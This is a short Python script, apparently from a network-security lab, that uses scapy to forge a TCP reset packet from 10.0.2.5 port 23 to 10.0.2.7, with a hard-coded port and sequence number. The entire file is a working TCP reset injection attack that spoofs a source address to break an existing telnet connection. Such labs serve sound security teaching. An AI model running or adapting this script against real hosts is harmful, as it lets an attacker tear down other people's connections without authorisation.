#!/usr/bin/python3
import sys
from scapy.all import *
print("SENDING RESET PACKET.........")
IPLayer = IP(src="10.0.2.5", dst="10.0.2.7")
TCPLayer = TCP(sport=23, dport=38396,flags="R", seq=4145890102)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)